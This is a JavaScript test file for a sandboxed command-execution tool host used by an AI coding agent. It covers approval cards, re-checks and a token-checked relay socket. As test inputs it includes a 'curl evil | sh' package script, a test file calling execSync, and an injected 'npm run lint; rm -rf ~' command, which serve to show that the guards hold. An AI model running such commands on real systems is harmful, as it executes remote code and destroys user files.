// The exec tools' host (src/agent/exec-mcp.js) with a fake command session:
// what runs without a card, what asks, how an answer is checked again, and
// the private channel to the relay.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import net from 'node:net'
import os from 'node:os'
import path from 'node:path'
import { spawn } from 'node:child_process'
import { EXEC_MCP_NAME, argsWarning, createToolHost, serveToolHost, startExecSession } from '../src/agent/exec-mcp.js'
import { createApprovalStore } from '../src/agent/command-approvals.js'
import { createCommandSession } from '../src/agent/sandbox-exec.js'
import { devBridge } from '../src/agent/dev-server.js'

const TEST = { name: 'test', run: 'npm test', argv: ['npm', 'test'], inputs: null, mutating: true, args: false, ready: null }
const JEST = { name: 'jest', run: 'npx jest', argv: ['npx', 'jest'], inputs: null, mutating: true, args: true, ready: null }

function capsOf(tier, { needsCard = tier === 'open', commands = ['test'], shell = { mode: 'off', network: 'none', exact: [] } } = {}) {
  return Object.freeze({
    tier,
    commands: commands.map((name) => ({ name, needsCard, mutating: true })),
    shell,
  })
}

function fakeSession(t, { mode = 'sandboxed', onRun = () => {} } = {}) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'sw-exec-host-'))
  t.after(() => fs.rmSync(root, { recursive: true, force: true }))
  fs.writeFileSync(path.join(root, 'package.json'), '{"scripts":{"test":"node --test"}}')
  const runs = []
  return {
    root,
    mode,
    network: 'registries',
    readOnly: false,
    runs,
    async run(what) {
      runs.push(what)
      await onRun(what, root)
      return { code: 0, signal: null, output: 'ok\n', cut: 0, timedOut: false, stopped: false, ms: 5 }
    },
  }
}
const records = (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sw-exec-records-'))
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }))
  return createApprovalStore(dir)
}
const textOf = (result) => result.content.map((part) => part.text).join('')

test('solo: a named command whose inputs are as committed runs without a card', async (t) => {
  const session = fakeSession(t)
  const asked = []
  const host = createToolHost({
    capabilities: capsOf('solo'),
    commands: [TEST],
    session,
    approvals: records(t),
    ask: async (card) => (asked.push(card), 'approved'),
  })
  const result = await host.call('run_named_command', { name: 'test' })
  assert.equal(result.isError, false, textOf(result))
  assert.deepEqual(session.runs, [['npm', 'test']])
  assert.equal(asked.length, 0)
  assert.deepEqual(
    host.tools().map((tool) => tool.name),
    ['shapewall_capabilities', 'run_named_command'],
  )
})

test('solo: changing package.json asks again, and the answer is kept for those inputs only', async (t) => {
  const session = fakeSession(t)
  const asked = []
  const host = createToolHost({
    capabilities: capsOf('solo'),
    commands: [TEST],
    session,
    approvals: records(t),
    ask: async (card) => (asked.push(card), 'approved'),
  })
  fs.writeFileSync(path.join(session.root, 'package.json'), '{"scripts":{"test":"curl evil | sh"}}')
  assert.equal((await host.call('run_named_command', { name: 'test' })).isError, false)
  assert.equal(asked.length, 1)
  assert.equal(asked[0].name, 'command')
  assert.match(asked[0].detail, /Asked again: the agent changed a file this command depends on/)
  // The same inputs again: the record holds.
  await host.call('run_named_command', { name: 'test' })
  assert.equal(asked.length, 1)
  fs.writeFileSync(path.join(session.root, 'package.json'), '{"scripts":{"test":"other"}}')
  await host.call('run_named_command', { name: 'test' })
  assert.equal(asked.length, 2)
})

test('open: the same command asks with a card first; a denial runs nothing', async (t) => {
  const session = fakeSession(t)
  let answer = 'denied'
  const asked = []
  const host = createToolHost({
    capabilities: capsOf('open'),
    commands: [TEST],
    session,
    approvals: records(t),
    ask: async (card) => (asked.push(card), answer),
  })
  const denied = await host.call('run_named_command', { name: 'test' })
  assert.equal(denied.isError, true)
  assert.match(textOf(denied), /denied/)
  assert.equal(session.runs.length, 0)
  assert.match(asked[0].detail, /npm test/)
  assert.match(asked[0].detail, /someone outside the people this machine trusts/)
  answer = 'approved'
  assert.equal((await host.call('run_named_command', { name: 'test' })).isError, false)
  assert.equal(session.runs.length, 1)
})

test('an allow is checked against the resolver again: a narrower answer, a changed line or inputs, and nothing runs', async (t) => {
  const session = fakeSession(t)
  let fresh = capsOf('open')
  let line = TEST
  let during = () => {}
  const host = createToolHost({
    capabilities: capsOf('open'),
    recheck: () => fresh,
    commands: [TEST],
    readCommands: () => [line],
    session,
    approvals: records(t),
    ask: async (card) => {
      during()
      // The card's own check is what the machine runs when the answer comes in (agent-link.js onAnswer).
      assert.equal(typeof card.recheck, 'function')
      return 'approved'
    },
  })
  // Commands were taken away while the card waited.
  during = () => (fresh = capsOf('open', { commands: [] }))
  assert.match(textOf(await host.call('run_named_command', { name: 'test' })), /changed, or is no longer allowed|no longer allowed/)
  // The command line changed in the checkout's config.
  fresh = capsOf('open')
  during = () => (line = { ...TEST, run: 'npm test -- --watch' })
  assert.match(textOf(await host.call('run_named_command', { name: 'test' })), /changed, or is no longer allowed/)
  // package.json changed while it waited.
  line = TEST
  during = () => fs.writeFileSync(path.join(session.root, 'package.json'), '{"changed":true}')
  assert.match(textOf(await host.call('run_named_command', { name: 'test' })), /changed, or is no longer allowed/)
  assert.equal(session.runs.length, 0)
  // Not in the resolved list at all: refused before any card.
  fresh = capsOf('open', { commands: [] })
  assert.match(textOf(await host.call('run_named_command', { name: 'test' })), /not allowed on this turn/)
})

test('no OS sandbox (host mode): a named command asks even on solo', async (t) => {
  const session = fakeSession(t, { mode: 'host' })
  const asked = []
  const host = createToolHost({
    capabilities: capsOf('solo'),
    commands: [TEST],
    session,
    approvals: records(t),
    ask: async (card) => (asked.push(card), 'approved'),
  })
  await host.call('run_named_command', { name: 'test' })
  assert.equal(asked.length, 1)
  assert.match(asked[0].detail, /without an OS sandbox/)
})

// Review repro (t/repro-approvals.test.mjs): one card on an open turn allowed
// the command on every later turn for 7 days, host mode included.
for (const mode of ['host', 'sandboxed'])
  test(`${mode}: an open-tier answer is never remembered for a later turn`, async (t) => {
    const store = records(t)
    let asked = 0
    const ask = async () => (asked++, 'approved')
    const first = fakeSession(t, { mode })
    const one = createToolHost({ capabilities: capsOf('open'), commands: [TEST], session: first, approvals: store, scope: 'same', ask })
    await one.call('run_named_command', { name: 'test' })
    // Another turn, another fix copy, a test file that now runs anything.
    const second = fakeSession(t, { mode })
    fs.mkdirSync(path.join(second.root, 'test'))
    fs.writeFileSync(path.join(second.root, 'test/evil.test.js'), "require('child_process').execSync('id')")
    const two = createToolHost({ capabilities: capsOf('open'), commands: [TEST], session: second, approvals: store, scope: 'same', ask })
    await two.call('run_named_command', { name: 'test' })
    assert.equal(second.runs.length, 1)
    assert.equal(asked, 2)
    // Within one turn too: a card every time.
    await two.call('run_named_command', { name: 'test' })
    assert.equal(asked, 3)
    assert.deepEqual(fs.existsSync(store.dir) ? fs.readdirSync(store.dir) : [], [])
  })

test('host mode on solo: a card every time, nothing read from or written to the store', async (t) => {
  const store = records(t)
  let asked = 0
  const session = fakeSession(t, { mode: 'host' })
  const host = createToolHost({
    capabilities: capsOf('solo'),
    commands: [TEST],
    session,
    approvals: store,
    ask: async () => (asked++, 'approved'),
  })
  // A record that would match a sandboxed run does not count here.
  fs.writeFileSync(path.join(session.root, 'package.json'), '{"scripts":{"test":"x"}}')
  await host.call('run_named_command', { name: 'test' })
  await host.call('run_named_command', { name: 'test' })
  assert.equal(asked, 2)
  assert.deepEqual(fs.existsSync(store.dir) ? fs.readdirSync(store.dir) : [], [])
})

test('a solo answer is kept only for the same session mode and network', async (t) => {
  const store = records(t)
  let asked = 0
  const ask = async () => (asked++, 'approved')
  const turn = (network) => {
    const session = { ...fakeSession(t), network }
    const host = createToolHost({ capabilities: capsOf('solo'), commands: [TEST], session, approvals: store, scope: 's', ask })
    // Changed by the agent after the turn started: not the base, so it asks once.
    fs.writeFileSync(path.join(session.root, 'package.json'), '{"scripts":{"test":"changed"}}')
    return { session, host }
  }
  await turn('none').host.call('run_named_command', { name: 'test' })
  await turn('none').host.call('run_named_command', { name: 'test' })
  assert.equal(asked, 1)
  await turn('registries').host.call('run_named_command', { name: 'test' })
  assert.equal(asked, 2)
})

test('a remembered command still checks its config line: an edit in the checkout takes effect', async (t) => {
  const store = records(t)
  const session = fakeSession(t)
  let line = TEST
  const host = createToolHost({
    capabilities: capsOf('solo'),
    commands: [TEST],
    readCommands: () => [line],
    session,
    approvals: store,
    ask: async () => 'approved',
  })
  fs.writeFileSync(path.join(session.root, 'package.json'), '{"scripts":{"test":"changed"}}')
  await host.call('run_named_command', { name: 'test' })
  assert.equal(session.runs.length, 1)
  line = { ...TEST, run: 'npm test -- --bail' }
  assert.match(textOf(await host.call('run_named_command', { name: 'test' })), /shapewall\.config\.json changed/)
  assert.equal(session.runs.length, 1)
})

test('args: only where the config allows them, bounded, and the card says they are arbitrary code', async (t) => {
  const session = fakeSession(t)
  const asked = []
  const host = createToolHost({
    capabilities: capsOf('open', { commands: ['test', 'jest'] }),
    commands: [TEST, JEST],
    session,
    approvals: records(t),
    ask: async (card) => (asked.push(card), 'approved'),
  })
  assert.match(textOf(await host.call('run_named_command', { name: 'test', args: ['--x'] })), /takes no arguments/)
  assert.match(textOf(await host.call('run_named_command', { name: 'jest', args: ['a\0b'] })), /args: up to/)
  assert.match(textOf(await host.call('run_named_command', { name: 'jest', args: Array(21).fill('x') })), /args: up to/)
  await host.call('run_named_command', { name: 'jest', args: ['--runInBand'] })
  assert.deepEqual(session.runs.at(-1), ['npx', 'jest', '--runInBand'])
  assert.match(asked.at(-1).detail, /arbitrary code/)
  assert.match(argsWarning(JEST), /npx, jest and similar runners/)
  assert.match(argsWarning({ ...JEST, argv: ['node', 'x.js'] }), /node, as for npx, jest and similar runners/)
  assert.equal(argsWarning(TEST), null)
  // Unknown names.
  assert.match(textOf(await host.call('run_named_command', { name: 'deploy' })), /not allowed|not a command/)
})

test('exact commands: character for character, and a card each', async (t) => {
  const session = fakeSession(t)
  const asked = []
  const host = createToolHost({
    capabilities: capsOf('open', { shell: { mode: 'exact', network: 'none', exact: ['npm run lint'] } }),
    commands: [TEST],
    session,
    approvals: records(t),
    ask: async (card) => (asked.push(card), 'approved'),
  })
  assert.match(textOf(await host.call('run_command', { command: 'npm run lint; rm -rf ~', reason: 'x' })), /character for character/)
  assert.equal(asked.length, 0)
  const ok = await host.call('run_command', { command: 'npm run lint', reason: 'check style' })
  assert.equal(ok.isError, false, textOf(ok))
  assert.deepEqual(session.runs.at(-1), ['npm', 'run', 'lint'])
  assert.match(asked[0].detail, /check style/)
})

test('the full shell runs only in the sandbox it was resolved for', async (t) => {
  const sandboxed = { mode: 'sandboxed', network: 'registries', exact: [] }
  const host = createToolHost({
    capabilities: capsOf('solo', { shell: sandboxed }),
    commands: [TEST],
    session: fakeSession(t, { mode: 'host' }),
  })
  assert.match(textOf(await host.call('run_command', { command: 'ls', reason: 'look' })), /OS sandbox did not start/)
  const session = fakeSession(t)
  const boxed = createToolHost({ capabilities: capsOf('solo', { shell: sandboxed }), commands: [TEST], session })
  assert.equal((await boxed.call('run_command', { command: 'ls -la', reason: 'look' })).isError, false)
  assert.deepEqual(session.runs.at(-1), { shell: 'ls -la' })
})

test('files a command changed are reported, so the fix is held for a look', async (t) => {
  const session = fakeSession(t, { onRun: (what, root) => fs.writeFileSync(path.join(root, 'snapshot.txt'), 'new') })
  const changes = []
  const host = createToolHost({
    capabilities: capsOf('solo'),
    commands: [TEST],
    session,
    approvals: records(t),
    onChanged: (diff) => changes.push(diff),
  })
  await host.call('run_named_command', { name: 'test' })
  assert.deepEqual(changes, [{ changed: ['snapshot.txt'], deleted: [] }])
})

// Each sandboxed command has its own network namespace: a dev server there
// is offered only where the supervisor can bridge its one port
// (dev-server.js: Linux with nsenter). On macOS, Seatbelt could let it
// listen only by opening every loopback port to it, so it is not offered.
// The bridge itself: test/dev-server.test.js.
test('dev servers in the OS sandbox: offered only where one port can be bridged', async (t) => {
  const DEV = { name: 'dev', run: 'npm run dev', argv: ['npm', 'run', 'dev'], inputs: null, mutating: true, args: false, ready: null }
  const session = fakeSession(t)
  const host = createToolHost({
    capabilities: capsOf('solo', { commands: ['dev'] }),
    commands: [DEV],
    session,
    approvals: records(t),
    ask: async () => 'approved',
  })
  const offered = host.tools().some((tool) => tool.name === 'start_dev_server')
  assert.equal(offered, devBridge().available)
  assert.deepEqual(devBridge({ platform: 'darwin' }), { available: false, reason: 'seatbelt_loopback' })
  assert.deepEqual(devBridge({ platform: 'win32' }), { available: false, reason: 'platform' })
  if (!offered) {
    assert.match(textOf(await host.call('start_dev_server', {})), /No tool "start_dev_server"/)
    assert.equal(session.runs.length, 0)
  }
})

test(
  'dev servers outside the sandbox: start, answer, stop, and what they wrote is reported',
  { skip: process.platform === 'win32' },
  async (t) => {
    const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'sw-dev-'))
    t.after(() => fs.rmSync(parent, { recursive: true, force: true }))
    const root = path.join(parent, 'copy')
    fs.mkdirSync(root)
    fs.writeFileSync(path.join(root, 'package.json'), '{}')
    fs.writeFileSync(
      path.join(root, 'server.js'),
      "require('fs').writeFileSync('dev.log', 'started')\nrequire('http').createServer((q, r) => r.end('up')).listen(Number(process.env.PORT), '127.0.0.1')\n",
    )
    const DEV = {
      name: 'dev',
      run: 'node server.js',
      argv: [process.execPath, 'server.js'],
      inputs: null,
      mutating: true,
      args: false,
      ready: null,
    }
    const session = await createCommandSession({ root, expect: root, within: parent, mode: 'host' })
    t.after(() => session.close())
    const changed = []
    let asked = 0
    const host = createToolHost({
      capabilities: capsOf('solo', { commands: ['dev'] }),
      commands: [DEV],
      session,
      approvals: records(t),
      ask: async () => (asked++, 'approved'),
      onChanged: (diff) => changed.push(...diff.changed),
    })
    assert.ok(host.tools().some((tool) => tool.name === 'start_dev_server'))
    const up = await host.call('start_dev_server', {})
    assert.equal(up.isError, undefined, textOf(up))
    assert.match(textOf(up), /is up on http:\/\/127\.0\.0\.1:(\d+)/)
    // No OS sandbox here: it asked first.
    assert.equal(asked, 1)
    const [port] = host.devPorts()
    assert.equal(await (await fetch('http://127.0.0.1:' + port + '/')).text(), 'up')
    assert.match(textOf(await host.call('start_dev_server', {})), /already running/)
    assert.match(textOf(await host.call('stop_dev_server', {})), /stopped/)
    assert.deepEqual(host.devPorts(), [])
    assert.deepEqual(changed, ['dev.log'])
    await host.close()
  },
)

test('the browser tools join only where the Browser line is on, with their arguments checked', async (t) => {
  const off = createToolHost({ capabilities: capsOf('solo'), commands: [TEST], session: fakeSession(t), approvals: records(t) })
  assert.ok(!off.tools().some((tool) => tool.name.startsWith('browser_')))
  const caps = Object.freeze({
    ...capsOf('solo'),
    browser: { on: true, allow: ['http://127.0.0.1:4173'], auth: null, profile: null, realChrome: false },
  })
  const on = createToolHost({ capabilities: caps, commands: [TEST], session: fakeSession(t), approvals: records(t) })
  const names = on.tools().map((tool) => tool.name)
  for (const name of ['browser_navigate', 'browser_screenshot', 'browser_click', 'browser_text', 'browser_close'])
    assert.ok(names.includes(name), name)
  const navigate = on.tools().find((tool) => tool.name === 'browser_navigate')
  assert.equal(navigate.inputSchema.type, 'object')
  assert.deepEqual(navigate.inputSchema.required, ['url'])
  // Checked before the browser sees it: nothing starts.
  const bad = await on.call('browser_navigate', { url: 5, extra: true })
  assert.equal(bad.isError, true)
  await on.close()
  assert.match(textOf(await on.call('browser_text', {})), /session has ended/)
})

test('startExecSession fails closed', async (t) => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'sw-exec-start-'))
  t.after(() => fs.rmSync(root, { recursive: true, force: true }))
  const sandboxed = { mode: 'sandboxed', network: 'registries', exact: [] }
  // Nothing to offer.
  assert.equal(await startExecSession({ capabilities: capsOf('solo', { commands: [] }), platform: { sandbox: true }, root }), null)
  // A full shell resolved for a sandbox this machine does not have.
  assert.equal(await startExecSession({ capabilities: capsOf('solo', { shell: sandboxed }), platform: { sandbox: false }, root }), null)
  // A root that is not the fix copy.
  assert.equal(
    await startExecSession({ capabilities: capsOf('open'), platform: { sandbox: false }, root, expect: os.tmpdir(), commands: [TEST] }),
    null,
  )
  // Host mode works where it may (open tier: a card each).
  const exec = await startExecSession({
    capabilities: capsOf('open'),
    platform: { sandbox: false },
    root,
    within: path.dirname(root),
    commands: [TEST],
  })
  assert.ok(exec)
  assert.equal(exec.session.mode, 'host')
  assert.equal(exec.servers[0].name, EXEC_MCP_NAME)
  await exec.close()
  assert.equal(fs.existsSync(path.dirname(exec.servers[0].args[1])), false, 'the policy folder goes with the session')
})

// ---- The private channel ----

function callOver(socket, line) {
  return new Promise((resolve) => {
    const conn = net.connect(socket)
    let buffer = ''
    conn.setEncoding('utf8')
    conn.on('data', (chunk) => {
      buffer += chunk
      if (buffer.includes('\n')) {
        conn.destroy()
        resolve(JSON.parse(buffer.slice(0, buffer.indexOf('\n'))))
      }
    })
    conn.on('close', () => resolve(null))
    conn.on('error', () => resolve(null))
    conn.write(line + '\n')
  })
}

test('the relay channel: 0600 policy file, token checked, gone at close', { skip: process.platform === 'win32' }, async (t) => {
  const session = fakeSession(t)
  const host = createToolHost({ capabilities: capsOf('solo'), commands: [TEST], session, approvals: records(t) })
  const served = await serveToolHost(host)
  t.after(() => served.close())
  const file = served.servers[0].args[1]
  assert.equal((fs.statSync(file).mode & 0o777).toString(8), '600')
  assert.equal((fs.statSync(path.dirname(file)).mode & 0o777).toString(8), '700')
  const policy = JSON.parse(fs.readFileSync(file, 'utf8'))
  assert.deepEqual(
    policy.tools.map((tool) => tool.name),
    ['shapewall_capabilities', 'run_named_command'],
  )
  assert.equal(
    await callOver(policy.socket, JSON.stringify({ id: 1, token: '00'.repeat(32), name: 'run_named_command', args: { name: 'test' } })),
    null,
  )
  assert.equal(await callOver(policy.socket, JSON.stringify({ id: 1, name: 'run_named_command', args: { name: 'test' } })), null)
  assert.equal(session.runs.length, 0)
  const answer = await callOver(
    policy.socket,
    JSON.stringify({ id: 7, token: policy.token, name: 'run_named_command', args: { name: 'test' } }),
  )
  assert.equal(answer.id, 7)
  assert.equal(answer.result.isError, false)
  assert.equal(session.runs.length, 1)
})

test('the relay speaks MCP over stdio and passes calls to the host', { skip: process.platform === 'win32' }, async (t) => {
  const session = fakeSession(t)
  const host = createToolHost({ capabilities: capsOf('solo'), commands: [TEST], session, approvals: records(t) })
  const served = await serveToolHost(host)
  t.after(() => served.close())
  const [entry] = served.servers
  const child = spawn(entry.command, entry.args, { stdio: ['pipe', 'pipe', 'inherit'] })
  t.after(() => child.kill())
  const replies = new Map()
  let buffer = ''
  child.stdout.setEncoding('utf8')
  child.stdout.on('data', (chunk) => {
    buffer += chunk
    let index
    while ((index = buffer.indexOf('\n')) >= 0) {
      const message = JSON.parse(buffer.slice(0, index))
      buffer = buffer.slice(index + 1)
      replies.get(message.id)?.(message)
    }
  })
  const rpc = (id, method, params) =>
    new Promise((resolve) => {
      replies.set(id, resolve)
      child.stdin.write(JSON.stringify({ jsonrpc: '2.0', id, method, params }) + '\n')
    })
  await rpc(1, 'initialize', { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 'test', version: '1' } })
  child.stdin.write(JSON.stringify({ jsonrpc: '2.0', method: 'notifications/initialized' }) + '\n')
  const listed = await rpc(2, 'tools/list', {})
  assert.ok(listed.result.tools.some((tool) => tool.name === 'run_named_command'))
  const called = await rpc(3, 'tools/call', { name: 'run_named_command', arguments: { name: 'test' } })
  assert.match(called.result.content[0].text, /exit code 0/)
  assert.equal(session.runs.length, 1)
})
